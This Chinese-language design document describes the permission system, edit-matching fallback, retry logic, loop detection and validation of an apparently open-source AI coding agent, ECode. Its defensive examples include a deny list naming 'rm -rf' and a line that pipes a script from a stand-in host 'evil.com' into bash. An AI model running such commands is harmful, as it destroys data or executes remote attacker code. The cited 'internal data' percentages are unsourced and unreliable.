## 一、权限系统原理

### 1.1 为什么需要四档模式？

**问题场景**：
- **过于宽松**（档 A 的 bypass 模式）：危险操作直接执行，用户无感知 → 安全风险
- **过于严格**（全部确认）：每次 `npm test` 都弹窗 → 体验割裂，用户疲劳后点"总是允许" → 等于没防护
- **场景差异**：开发时希望文件编辑自动通过（高频操作），但 `rm -rf` 必须拦截

**四档设计**：
| 档位 | 适用场景 | 行为 |
|------|----------|------|
| `default` | 日常使用 | 危险操作确认，常规操作放行 |
| `acceptEdits` | 重构/编辑密集场景 | 文件编辑自动通过，其他危险操作仍确认 |
| `plan` | 生产环境/审计场景 | 所有操作都确认（最严格） |
| `bypass` | 开发调试 | 全自动（仅开发环境，生产禁用） |

**核心思想**：权限控制不是"一刀切"，而是**按场景分档 + 按操作分级**。

### 1.2 规则引擎的优先级逻辑

```
用户配置:
  deniedCommands: ["rm -rf", "git push --force"]
  allowedCommands: ["npm test", "git status"]
  alwaysDenyPaths: [".env", "*.key"]

检查流程:
  1. 命令解析 → 提取主命令 + 危险参数
  2. deny 规则检查 → 命中 → 直接拒绝 (优先级最高)
  3. 路径黑名单检查 → 操作 .env → 直接拒绝
  4. allow 规则检查 → 命中 → 放行
  5. 路径白名单检查 → 操作 src/** → 放行
  6. 兜底逻辑 → 根据档位决定 (default: ask, acceptEdits: 看工具类型, bypass: allow)
```

**为什么 deny 优先级最高？**
- 安全原则："黑名单优先"（防火墙通用设计）
- 避免误配置：即使用户不小心把 `rm -rf` 加到 `allowedCommands`，deny 仍能拦截

### 1.3 命令解析的边界

**目标**：识别"主命令 + 危险参数"，无需完整 Bash AST。

**支持的语法**：
```bash
# 单命令
rm -rf /tmp                      → 主命令: rm, 危险参数: -rf

# 引号
rm "file with spaces.txt"        → 主命令: rm, 参数: file with spaces.txt

# 管道
cat file.txt | grep error        → 拆分为: cat file.txt 和 grep error

# 逻辑运算
npm test && npm run build        → 拆分为: npm test 和 npm run build
```

**不支持的语法**（降级为 dangerous）：
```bash
# 复杂嵌套
$(curl http://evil.com/script.sh | bash)   → 标记为 dangerous

# 变量展开
rm -rf $DANGEROUS_VAR                       → 标记为 dangerous

# 函数调用
my_function arg1 arg2                       → 标记为 dangerous（无法判断函数体）
```

**设计权衡**：
- 完整 Bash 解析需要 shell-quote / bash-parser（增加依赖 + 复杂度）
- 90% 的危险命令都是"简单命令 + 危险参数"（如 `rm -rf`、`chmod 777`）
- **保守策略**：解析失败 → 标记 dangerous → 需确认 → 宁可多问，不可漏过

## 二、edit 工具正确性原理

### 2.1 为什么匹配会失败？

**LLM 生成的 `old_string` 与文件实际内容的常见差异**：

| 差异类型 | 示例 | 原因 |
|----------|------|------|
| 缩进 | 模型：2 空格，实际：4 空格 | 模型"脑补"了项目风格 |
| 空格 | 模型：`if(x)`，实际：`if (x)` | Formatter 行为差异 |
| 注释 | 模型遗漏了 `// TODO` | 只记住了"主逻辑" |
| 部分匹配 | 模型只给了前 3 行，实际要替换 5 行 | 上下文截断 |

**数据**：aider 的编辑格式测试显示，正确的错误恢复能将成功率从 20% 提升到 61%。

### 2.2 fuzzy search 的工作原理

**Levenshtein 距离**：字符串 A 变为 B 需要的最少编辑次数（插入/删除/替换）。

```
示例:
  模型给出: "function getUserName() {"
  文件实际: "function getUsername() {"
  
  Levenshtein 距离: 1 (N → n)
```

**算法流程**：
```
1. 对文件每一行计算与 old_string 的 Levenshtein 距离
2. 找到距离最小的行 → 这是"最接近"的匹配
3. 返回该行 ±5 行的窗口（提供上下文）
4. 回喂给 LLM: "你给的是 X，实际是 Y，请修正"
```

**为什么选 fastest-levenshtein？**
- 纯 JS 实现，无原生依赖（跨平台）
- 性能：1000 行文件 < 10ms
- 体积：1KB（gzip 后）

### 2.3 行号模式 vs 匹配模式

**两种模式对比**：

| 模式 | 优点 | 缺点 | 适用场景 |
|------|------|------|----------|
| **匹配模式**（默认） | 语义清晰，代码可读性好 | 匹配可能失败 | 小范围修改、有明确上下文 |
| **行号模式** | 精确，不会失败 | 需要精确行号，代码可读性差 | 大文件、多点修改、fuzzy search 失败后降级 |

**工作流**：
```
1. 模型首次尝试 → 匹配模式
2. 匹配失败 → fuzzy search 回喂真实行
3. 模型根据真实行重试 → 匹配模式
4. 仍失败（如大文件、多个相似位置）→ 模型切换为行号模式
```

**行号模式的 JSON schema**：
```json
{
  "name": "edit_file",
  "parameters": {
    "file_path": "src/agent.ts",
    "line_number": 45,           // 精确行号（可选）
    "old_string": "...",         // line_number 存在时忽略匹配
    "new_string": "..."
  }
}
```

## 三、错误恢复策略解析

### 3.1 API 错误分类

**可重试错误**（Transient）：
- `429 Too Many Requests`：触发 rate limit，等待后可重试
- `500 Internal Server Error`：服务端瞬时故障
- `502 Bad Gateway` / `503 Service Unavailable`：负载均衡层问题
- `504 Gateway Timeout`：长响应超时

**不可重试错误**（Permanent）：
- `400 Bad Request`：参数格式错误（重试也会失败）
- `401 Unauthorized`：API Key 错误
- `403 Forbidden`：权限不足
- `404 Not Found`：端点不存在

**设计依据**：HTTP RFC 7231 定义的 4xx（客户端错误）vs 5xx（服务端错误）。

### 3.2 指数退避 + jitter 原理

**问题**：多个客户端同时遇到 429，同时等待 1 秒后重试 → 同时再次触发 429 → "惊群效应"。

**解决**：
```
基础延迟: delay = baseDelay * 2^attempt
  attempt 0: 1s
  attempt 1: 2s
  attempt 2: 4s

加入 jitter (随机抖动): delay += random(0, 1000ms)
  attempt 0: 1.3s (随机)
  attempt 1: 2.7s
  attempt 2: 4.2s

上限保护: delay = min(delay, maxDelay)
  防止 2^10 = 1024s (17 分钟) 的极端情况
```

**效果**：多客户端的重试请求在时间轴上"错开"，减少同时冲击。

**参考**：AWS SDK、Google Cloud SDK 都采用此策略。

### 3.3 死循环检测的哈希策略

**问题**：如何判断"两次操作是重复的"？

**方案 1：JSON.stringify**（❌ 不稳定）
```js
JSON.stringify({file: "a.ts", line: 10})  // key 顺序不保证
JSON.stringify({line: 10, file: "a.ts"})  // 可能产生不同字符串
```

**方案 2：稳定哈希**（✅ 采用）
```ts
function stableHash(obj: unknown): string {
  if (typeof obj !== 'object' || obj === null) {
    return String(obj);
  }
  
  // 按 key 排序后拼接
  const keys = Object.keys(obj).sort();
  const pairs = keys.map(k => `${k}:${stableHash(obj[k])}`);
  return pairs.join('|');
}

// 示例
stableHash({file: "a.ts", line: 10})  // "file:a.ts|line:10"
stableHash({line: 10, file: "a.ts"})  // "file:a.ts|line:10" (相同)
```

**滑动窗口**：
- 只看最近 5 轮（太长会误判"间隔很久的正常重试"）
- 窗口内相同哈希 ≥3 次 → 触发警告

## 四、强制后置验证设计

### 4.1 为什么不信任模型自报"完成"？

**真实案例**（Claude Code 内部数据）：
- 22.6% 的失败源于"模型说完成了，但代码编译不通过"
- 15.3% 的失败源于"模型说测试通过，但实际挂了"

**根本原因**：
- LLM 无法"真正执行"代码，只能"推理"
- 上下文中可能有过时信息（如"文件 A 的旧版本"）
- 模型的"完成"标准可能与用户不同（模型认为"逻辑对了"，但忽略了语法错误）

### 4.2 验证链的设计权衡

**全量 vs 增量**：

| 策略 | 优点 | 缺点 | M4 选择 |
|------|------|------|---------|
| 全量验证（整个项目） | 完整、准确 | 慢（大项目 10+ 秒） | ✅ M4 采用（简单可靠） |
| 增量验证（只检查变更文件） | 快（< 1 秒） | 复杂（需依赖分析） | ❌ M5+ 优化 |

**命令选择优先级**：
```
1. 项目自定义脚本（package.json 的 scripts）
   → 优先使用，尊重项目习惯
   
2. 标准命令（tsc --noEmit / npm test）
   → 通用方案
   
3. 最小检查（python -m py_compile）
   → 兜底方案
```

**为什么验证可以配置关闭？**
- 开发调试时可能需要"先提交后验证"的工作流
- 某些项目验证耗时过长（如集成测试 > 1 分钟）
- 给用户选择权，但**默认开启**

## 五、混合流式输出协议

### 5.1 为什么工具调用不能流式？

**技术限制**：
```json
// LLM 流式返回的 tool_use（分多个 chunk）
chunk1: {"type": "tool_use", "name": "edit_file", "inp
chunk2: ut": {"file_path": "src/agent.ts", "old_stri
chunk3: ng": "function foo() {", "new_string": "functi
chunk4: on bar() {"}}
```

**问题**：
- `input` 是 JSON 对象，必须**完整接收**才能解析
- 部分 JSON 无法执行（缺少闭合括号）
- Anthropic / OpenAI API 都是"工具调用结束时返回完整 JSON"

**设计结论**：工具调用天然是"非流式"的，但可以通过**事件拆分**模拟进度。

### 5.2 事件序列设计

**完整的一次工具调用**：
```
1. tool_use_start   → UI 显示 "🔧 reading src/agent.ts..."
2. (执行中)         → 无事件（短时间操作）
3. tool_use_complete → UI 显示 "✓ read 123 lines (45ms)"

bash 命令特殊处理:
1. tool_use_start   → UI 显示 "🔧 running npm test..."
2. tool_progress    → UI 追加 stdout ("PASS src/agent.test.ts")
2. tool_progress    → UI 追加 stdout ("PASS src/session.test.ts")
3. tool_use_complete → UI 显示 "✓ test passed (2.3s)"
```

**为什么 bash 特殊？**
- bash 命令可能耗时长（如 `npm install`）
- stdout 可以实时读取（Node.js 的 `spawn` 支持 stream）
- 其他工具（read_file / edit_file）都是瞬时完成（< 100ms），无需进度

### 5.3 长输出折叠策略

**问题**：bash 命令可能输出 10000 行（如 `npm install --verbose`），全量显示：
- 占用大量终端空间
- 滚动体验差
- 实际有用信息可能只在最后几行

**方案**：
```
输出 > 50 行时折叠:
  显示: 前 10 行
       ... 30 lines hidden (press 'e' to expand) ...
       后 10 行
```

**交互**：
- 默认折叠（节省空间）
- 按 `e` 展开（查看完整输出）
- 按 `c` 复制到剪贴板（调试用）

## 六、常见问题（FAQ）

### Q1：权限系统会影响性能吗？

**A**：几乎无影响。
- 命令解析：< 1ms（轻量正则）
- 规则检查：< 5ms（内存查表，无 I/O）
- 总开销：单次工具调用 < 10ms（相比网络延迟 100-500ms 可忽略）

### Q2：fuzzy search 会误匹配吗？

**A**：有可能，但概率很低。
- Levenshtein 距离是"最接近"，不是"完全匹配"
- 如果文件有多个相似行（如重复的 `import` 语句），可能匹配到错误行
- **降级方案**：模型看到回喂的真实行后，如果发现不对，会切换为行号模式

### Q3：为什么不用 Docker 沙箱执行？

**A**：
- M4 的目标是"拦截危险操作"，不是"隔离执行环境"
- Docker 沙箱需要额外依赖（Docker Engine）+ 复杂配置
- 权限系统已能覆盖 90% 的安全场景（用户明确操作本地文件，不需要沙箱）
- 沙箱执行属于 M5+ 的高级功能（企业级部署场景）

### Q4：强制验证会拖慢迭代吗？

**A**：有影响，但可控。
- 小项目：`tsc --noEmit` < 2 秒
- 大项目：增量编译 + 并行测试，通常 < 5 秒
- **配置选项**：可关闭验证（`validation.enabled=false`），但不推荐

### Q5：死循环检测会误判"正常重试"吗？

**A**：不会。
- 滑动窗口只看最近 5 轮（不是"从会话开始"）
- 触发条件是"5 轮内重复 ≥3 次"（不是"整个会话重复 3 次"）
- 正常工作流（如"读 → 编辑 → 验证 → 再读"）不会命中（中间有不同操作）

### Q6：权限配置支持通配符吗？

**A**：M4 不支持，M5+ 支持。
- M4：精确匹配（`allowedCommands: ["npm test"]`）
- M5+：glob 模式（`alwaysAllowPaths: ["src/**/*.ts"]`）
- **原因**：M4 优先保证核心功能稳定，glob 匹配增加复杂度

## 七、与 Claude Code 的对比

| 功能 | Claude Code | ECode M4 | 差异说明 |
|------|-------------|----------|----------|
| 权限档位 | 4 档 | 4 档 | 完全对齐 |
| 配置格式 | `.claude/settings.json` | 兼容读取 | 可直接迁移 |
| 命令解析 | 完整 Bash parser | 轻量解析 + 保守降级 | ECode 更轻量，边缘 case 保守处理 |
| edit 重试 | 回喂真实行 | 回喂真实行 + fuzzy search | ECode 增加 fuzzy search |
| API 重试 | 指数退避 + jitter | 指数退避 + jitter | 策略相同 |
| 强制验证 | 有（隐式） | 有（显式） | ECode 更透明 |
| 流式输出 | tool progress | tool progress (bash only) | Claude Code 覆盖更多工具 |

**设计差异的原因**：
- Claude Code 是闭源商业产品，可以依赖内部基础设施（如沙箱）
- ECode 是开源工具，优先"开箱即用"（零依赖、跨平台）
- ECode 在"核心功能对齐"的前提下，选择更轻量的实现路径

## 八、技术债务与后续演进

### 8.1 已知限制（M4 不解决，M5+ 处理）

| 限制 | 影响 | 计划 |
|------|------|------|
| 命令解析不支持复杂嵌套 | 嵌套子 shell → 标记 dangerous | M5：引入 shell-quote |
| 验证是全量（非增量） | 大项目验证慢（> 5s） | M5：增量编译 + 依赖分析 |
| fuzzy search 性能（超大文件 > 10000 行） | 编辑卡顿 | M5：限制搜索窗口 / 行号模式提示 |
| 工具并行执行 | 只读工具可并行，M4 未实现 | M5：Promise.all 并发 |

### 8.2 扩展点设计

**为 M5+ 预留的接口**：

```ts
// 权限系统扩展：自定义规则
interface CustomRule {
  matcher: (tool: string, input: unknown) => boolean;
  verdict: 'allow' | 'deny' | 'ask';
}

// 验证系统扩展：自定义验证器
interface CustomValidator {
  name: string;
  check: (files: string[]) => Promise<ValidationResult>;
}

// 错误恢复扩展：自定义重试策略
interface CustomRetryPolicy {
  shouldRetry: (err: unknown) => boolean;
  getDelay: (attempt: number) => number;
}
```

**扩展示例**（M5+ 用户可实现）：
```ts
// 自定义规则：允许特定 IP 的网络请求
const customRule: CustomRule = {
  matcher: (tool, input) => 
    tool === 'bash' && 
    input.command.includes('curl 192.168.1.'),
  verdict: 'allow'
};

// 自定义验证器：运行集成测试
const e2eValidator: CustomValidator = {
  name: 'e2e-tests',
  check: async (files) => {
    if (files.some(f => f.startsWith('src/pages/'))) {
      return runCommand('npm run test:e2e');
    }
    return { success: true };
  }
};
```
